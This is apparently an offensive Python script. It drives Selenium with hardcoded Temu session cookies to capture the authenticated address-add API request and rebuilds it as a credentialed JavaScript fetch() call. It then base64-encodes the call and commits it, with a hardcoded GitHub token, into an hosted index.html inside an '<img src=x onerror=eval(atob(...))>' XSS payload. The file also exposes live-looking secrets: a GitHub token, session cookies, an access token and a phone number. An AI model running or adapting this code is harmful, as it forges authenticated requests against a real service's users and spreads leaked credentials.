import threading
import time
import json
import base64
import requests
import re
import sys
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains

# ---- GITHUB CONFIG ----dd
print('start')
GITHUB_TOKEN = "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"
OWNER = "dasdsa0d8s9a"
REPO = "dsadsadsadsadasdsa"
FILE_PATH = "index.html"
BRANCH = "main"
COMMIT_MESSAGE = "Auto-update code constant"

# ---- SELENIUM & FETCH CONFIG ----
cookies_str = """region=135;timezone=Africa%2FCasablanca;_hal_tag=AJz8+kNyYqt43dHVad+/k+iT+be/3efHoIsIXJW5sjlJqcyhP+8jgU/Uv41VB+Ca3A==;api_uid=CnAoNGld4q6zMR7QDlOBAg==;language=en;currency=MAD;__cf_bm=YIbjGksmOt5QyGetVWKpmiPkbLllj_2kkcMyh_ecEpM-1768491657-1.0.1.1-Efs_S2VzypbSNaBZMM2ApOu6klxe_m.CxxXw1.Bvqaoaz2HLh7gLDsCAhlFebKFpYnD1cM4jgdtZf0r65jD9BbkigkSQX4bekCBqM2tyaQM;_bee=VuhjABOWgOza6PnveMRpRBlnuAfcNhlz;_nano_fp=GVL18b-t8bLYqDr1cJLSw#ZjPEAnA0FrRTwgkPRf6nK;_ttc=3.INyd00PyRXeE.1799296569;AccessToken=AA24UTAI3NUYIOPKNRACV4HG4ZXS3ZCE5AGHFL2TSJLID65GNNTQ0110872ba99a;dilx=1w1B-_vEzgtm75UTmek5;hfsc=L3yMf4426Tv+15PNfQ==;img_sup=avif%2Cwebp;isLogin=1768167527576;njrpl=VuhjABOWgOza6PnveMRpRBlnuAfcNhlz;user_uin=BBBJWWX4FKB7OMKNMY36MKDDDNA5DR4TYUJ7LQP6;verifyAuthToken=DlqFpTAWfQ8Wnj43CH3V9A0a646c09b651ccc19"""
url = "https://www.temu.com/create_address.html?count=1&_x_vst_scene=adg&_x_ads_channel=google&_x_ads_sub_channel=search&_x_ads_account=2214151713&_x_ads_set=21195307184&_x_ads_id=161885869155&_x_ads_creative_id=696825321277&_x_ns_source=g&_x_ns_gclid=Cj0KCQiAgvPKBhCxARIsAOlK_EqvxZBon53EomF7lhV2Sish3MDLjA4j9EZ3AolNkqPjA8CIK3vHRIIaAmSSEALw_wcB&_x_ns_placement=&_x_ns_match_type=e&_x_ns_ad_position=&_x_ns_product_id=&_x_ns_target=&_x_ns_devicemodel=&_x_ns_wbraid=CkEKCQiAgvPKBhCLARIwAH1tUphJlG5N4Od23MyVP2UVrsnLWRzjfCUxdAoeWGPFzNqqp6uBBR7Ip0QkPvnHGgK9Rg&_x_ns_gbraid=0AAAAAo4mICG9bVB0aAxpcyXEA65gWRkWi&_x_ns_keyword=temu&_x_ns_targetid=kwd-4583699489&_x_ns_extensionid=&_x_sessn_id=swgey028i8&refer_page_name=address&refer_page_id=10018_1768476071688_yrf2qjw9mv&refer_page_sn=10018&no_cache_id=9a5yp"
TARGET_FETCH_URL = "https://www.temu.com/api/bg-origenes/address/add"

def update_github_file_with_base64(base64_payload: str):
    """
    Fetches a file from GitHub, replaces a placeholder, and commits the change.
    This function is designed to run in a background process.
    """
    print("\n--- Background GitHub Update Started ---")
    try:
        print(f"  [GitHub] Fetching {FILE_PATH} from {OWNER}/{REPO}...")
        api_url_get = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{FILE_PATH}"
        headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
        r_get = requests.get(api_url_get, headers=headers, params={"ref": BRANCH}, timeout=30)
        r_get.raise_for_status()
        file_data = r_get.json()
        sha = file_data["sha"]
        print(f"  [GitHub] File fetched. Current SHA: {sha[:7]}")

        content_str = (file_data.get("content") or "").replace("\n", "").strip()
        old_text = base64.b64decode(content_str.encode("utf-8")).decode("utf-8", errors="replace")
        print("  [GitHub] Decoded original file content.")

        pattern = r"(<img\s+src=x\s+onerror=eval\(atob\(')([^']+)('\)\))"
        updated_text, count = re.subn(pattern, rf"\g<1>{base64_payload}\g<3>", old_text, count=1)
        if count == 0:
            print("  [GitHub ERROR] Could not find placeholder in the target file. Aborting update.", file=sys.stderr)
            return

        if updated_text == old_text:
            print("  [GitHub] No change detected. Nothing to commit.")
            return

        print("  [GitHub] Placeholder replaced in memory.")

        api_url_put = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{FILE_PATH}"
        new_content_b64 = base64.b64encode(updated_text.encode("utf-8")).decode("utf-8")
        put_payload = {"message": COMMIT_MESSAGE, "content": new_content_b64, "sha": sha, "branch": BRANCH}
        r_put = requests.put(api_url_put, headers=headers, json=put_payload, timeout=30)
        r_put.raise_for_status()
        result = r_put.json()
        commit_url = (result.get("commit") or {}).get("html_url")
        print(f"\n  [GitHub SUCCESS] Successfully updated {FILE_PATH}.")
        if commit_url:
            print(f"  Commit URL: {commit_url}")

    except requests.HTTPError as e:
        print(f"\n  [GitHub FATAL ERROR] API request failed: {e.response.status_code}", file=sys.stderr)
        print("  Response body:", e.response.text, file=sys.stderr)
    except Exception as e:
        print(f"\n  [GitHub FATAL ERROR] An unexpected error occurred: {e}", file=sys.stderr)
        traceback.print_exc(file=sys.stderr)
    finally:
        print("--- Background GitHub Update Finished ---")

def generate_fetch_code() -> str:
    """Uses Selenium to generate the Base64 encoded fetch command."""
    print("--- Phase 1: Generating Fetch Payload via Selenium ---")
    chrome_options = Options()
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

    driver = None
    base64_encoded_fetch = ""
    try:
        print("  [Step 1/7] Initializing headless Chrome browser...")
        driver = webdriver.Chrome(options=chrome_options)
        print("  [Step 1/7] Browser initialized.")
        
        print(f"  [Step 2/7] Navigating to URL and setting cookies...")
        driver.get(url)
        for cookie_pair in cookies_str.split(';'):
            if '=' in cookie_pair:
                name, value = cookie_pair.split('=', 1)
                driver.add_cookie({'name': name.strip(), 'value': value.strip(), 'domain': '.temu.com'})
        driver.refresh()
        print("  [Step 2/7] Cookies added and page refreshed.")

        print("  [Steps 3-6] Filling address form, region, and phone number...")
        try:
            WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, "//input[@aria-label='Last Name']")))
        except:
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Add a new address']"))).click()
        WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, "//input[@aria-label='Last Name']")))
        driver.find_element(By.XPATH, "//input[@aria-label='Last Name']").send_keys("Doe")
        driver.find_element(By.XPATH, "//input[contains(@aria-label, 'First Name')]").send_keys("John")
        driver.find_element(By.XPATH, "//input[@aria-label='Street address Street, building/apartment number, district etc' and not(contains(@style, 'display:none'))]").send_keys("123 Main St")
        region_div = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[@aria-label='Region Select']")))
        ActionChains(driver).move_to_element(region_div).click().pause(1).move_by_offset(0, -50).click().pause(0.5).click().perform()
        phone_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter a 9-digit number']")))
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", phone_input)
        phone_input.clear()
        for char in "770893233":
            phone_input.send_keys(char)
            time.sleep(0.1)
        print("  [Steps 3-6] Form filling complete.")

        print("  [Step 7/7] Clicking 'Save' and capturing network logs...")
        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//span[@aria-label='Set as my default address']"))).click()
        
        # --- Enhanced Debugging ---
        print("  [DEBUG] Taking screenshot and saving page source before clicking 'Save'...")
        try:
            driver.save_screenshot('form_before_save.png')
            with open('form_before_save.html', 'w', encoding='utf-8') as f:
                f.write(driver.page_source)
            print("  [DEBUG] Screenshot and page source saved as form_before_save.png/.html")
        except Exception as e:
            print(f"  [DEBUG-ERROR] Could not save screenshot or page source: {e}", file=sys.stderr)

        save_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(., 'Save') and @role='button']")))
        print("  [DEBUG] 'Save' button is clickable. Now clicking it.")
        save_button.click()
        
        print("  [DEBUG] Waiting 10 seconds for network requests to be logged...")
        time.sleep(10)
        
        # --- Enhanced Debugging ---
        print("  [DEBUG] Taking screenshot and saving page source after clicking 'Save'...")
        try:
            driver.save_screenshot('form_after_save.png')
            with open('form_after_save.html', 'w', encoding='utf-8') as f:
                f.write(driver.page_source)
            print("  [DEBUG] Screenshot and page source saved as form_after_save.png/.html")
        except Exception as e:
            print(f"  [DEBUG-ERROR] Could not save screenshot or page source: {e}", file=sys.stderr)
        
        logs = driver.get_log('performance')
        for entry in logs:
            log = json.loads(entry['message'])['message']
            if log['method'] == 'Network.requestWillBeSent':
                request = log['params']['request']
                if request['url'] == TARGET_FETCH_URL:
                    print(f"  [SUCCESS] Found target fetch request!")
                    url_req, method, headers = request['url'], request['method'], request['headers']
                    options_parts, header_parts = [], []
                    options_parts.append(f'  "method": "{method}"')
                    excluded_headers = ['accept-charset', 'accept-encoding', 'access-control-request-headers', 'access-control-request-method', 'connection', 'content-length', 'cookie', 'date', 'dnt', 'expect', 'host', 'keep-alive', 'origin', 'permissions-policy', 'referer', 'te', 'trailer', 'transfer-encoding', 'upgrade', 'via']
                    for key, value in headers.items():
                        if key.lower().startswith(('proxy-', 'sec-', ':')) or key.lower() in excluded_headers: continue
                        cleaned_value = str(value).replace('"', '\\"')
                        header_parts.append(f'    "{key}": "{cleaned_value}"')
                    if header_parts: options_parts.append('  "headers": {\n' + ",\n".join(header_parts) + "\n  }")
                    if 'Referer' in headers:
                        referer_value = str(headers["Referer"]).replace('"', '\\"')
                        options_parts.append(f'  "referrer": "{referer_value}"')
                    if 'postData' in request:
                        post_data = request['postData']
                        try:
                            post_str = "JSON.stringify(" + json.dumps(json.loads(post_data), indent=2) + ")"
                        except json.JSONDecodeError:
                            escaped_post_data = post_data.replace('"', '\\"')
                            post_str = f'"{escaped_post_data}"'
                        options_parts.append(f'  "body": {post_str}')
                    options_parts.extend(['  "mode": "cors"', '  "credentials": "include"'])
                    fetch_cmd = f'fetch("{url_req}", {{\n' + ",\n".join(options_parts) + "\n});"
                    base64_encoded_fetch = base64.b64encode(fetch_cmd.encode('utf-8')).decode('utf-8')
                    
                    # --- Print debug output as requested ---
                    if base64_encoded_fetch:
                        print("\n--- Generated Fetch Command (before Base64 encoding) ---")
                        print(fetch_cmd)
                        print("\n--- Base64 Encoded Fetch Command ---")
                        print(base64_encoded_fetch)
                        print("-" * 50)

                    break
        if not base64_encoded_fetch: print("  [ERROR] Target URL not found in network logs.", file=sys.stderr)
    except Exception as e:
        print(f"\n[FATAL ERROR] An exception occurred during Selenium execution: {e}", file=sys.stderr)
        traceback.print_exc(file=sys.stderr)
    finally:
        if driver: driver.quit()
        print("--- Selenium Phase Finished ---")
    return base64_encoded_fetch

def main():
    if not GITHUB_TOKEN or "ghp_" not in GITHUB_TOKEN:
        print("Error: Please configure your GITHUB_TOKEN at the top of the script.", file=sys.stderr)
        return 1

    new_base64_code = generate_fetch_code()
    
    if new_base64_code:
        print("\n--- Phase 2: Starting GitHub Update in Background ---")
        github_thread = threading.Thread(
            target=update_github_file_with_base64,
            args=(new_base64_code,)
        )
        github_thread.daemon = True
        github_thread.start()
        print("  [INFO] Background task for GitHub update has been dispatched.")
        print("  [INFO] The main script will now exit. Check console for background task status.")
        time.sleep(2)
    else:
        print("\n[ERROR] No Base64 payload was generated. GitHub update will not run.", file=sys.stderr)
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
